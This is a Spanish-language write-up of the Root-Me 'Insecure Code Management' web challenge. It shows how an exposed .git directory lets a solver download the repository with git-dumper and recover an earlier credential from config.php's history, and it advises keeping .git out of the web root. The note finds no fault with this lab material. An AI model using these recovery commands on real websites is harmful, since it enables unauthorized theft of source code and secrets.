# Web - Server — Insecure Code Management

## Descripción

- **Puntos:** 20
- **Reto:** [Root-Me — Insecure Code Management](https://www.root-me.org/en/Challenges/Web-Server/Insecure-Code-Management)

La instancia publica su directorio `.git`, lo que permite reconstruir versiones anteriores y recuperar un valor de autenticación que ya no está en la revisión actual.

## Solución

1. Comprobar la exposición de `/.git/HEAD`, `/.git/config` y `/.git/logs/HEAD`.
2. Recuperar el repositorio únicamente desde la instancia autorizada:

   ```bash
   git-dumper 'http://challenge01.root-me.org/web-serveur/ch61/.git/' recovered-git
   ```

3. Revisar el historial y los cambios de `config.php`:

   ```bash
   git -C recovered-git log --all
   git -C recovered-git show '<revision-anterior>:config.php'
   ```

4. Usar el valor histórico encontrado solamente en el formulario de validación del reto.

## Estado de revalidación

La exposición y la ruta de recuperación fueron comprobadas en segundo plano. Falta enviar la respuesta autenticada y registrar el «Like» en Root-Me; hasta entonces no se cuenta como validado.

## Notas adicionales

- Nunca se debe publicar `.git` en la raíz web; los repositorios deben residir fuera del *document root*.
- El valor de autenticación no se versiona en este repositorio.

## Referencias

- [Reto oficial](https://www.root-me.org/en/Challenges/Web-Server/Insecure-Code-Management)
- [GitHub Security Lab — Exposed Git repositories](https://securitylab.github.com/resources/git-commands-for-security/)
